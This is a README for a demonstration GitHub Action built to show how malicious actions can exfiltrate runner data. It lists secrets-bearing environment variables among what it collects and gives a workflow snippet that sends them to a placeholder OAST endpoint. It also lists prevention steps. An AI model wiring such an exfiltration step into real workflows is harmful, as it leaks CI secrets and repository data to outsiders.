# Malicious Action Demo

This is a demonstration of how malicious GitHub Actions can exfiltrate data from runners.

## ⚠️ WARNING

This is for **educational and security testing purposes only**. Do not use this for malicious purposes.

## What This Action Does

1. **Collects Data**: Gathers hostname, environment variables, and repository information
2. **Exfiltrates Data**: Sends collected data to a specified endpoint
3. **Demonstrates Attack**: Shows how malicious actions can steal sensitive information

## Usage

```yaml
- name: Malicious Data Exfiltration
  uses: ./malicious-action-demo
  with:
    target_endpoint: 'your-oast-endpoint.com'
    data_type: 'hostname'  # or 'environment', 'repository_info', 'all'
```

## Data Collected

- **Hostname**: Runner hostname information
- **Environment**: All environment variables (including secrets)
- **Repository Info**: Repository metadata and context
- **Metadata**: Timestamp and action information

## Prevention

1. **Pin Actions**: Always pin to specific commit SHAs
2. **Review Code**: Check action source code before use
3. **Use Trusted Sources**: Only use actions from trusted repositories
4. **Implement Policies**: Use security policies to control action usage
5. **Monitor Usage**: Track action usage and data exfiltration attempts

## Security Testing

This action is designed for:
- Security awareness training
- Penetration testing
- Red team exercises
- Security policy validation

## Legal Notice

Use this action only on repositories you own or have explicit permission to test. Unauthorized use may violate terms of service and applicable laws.
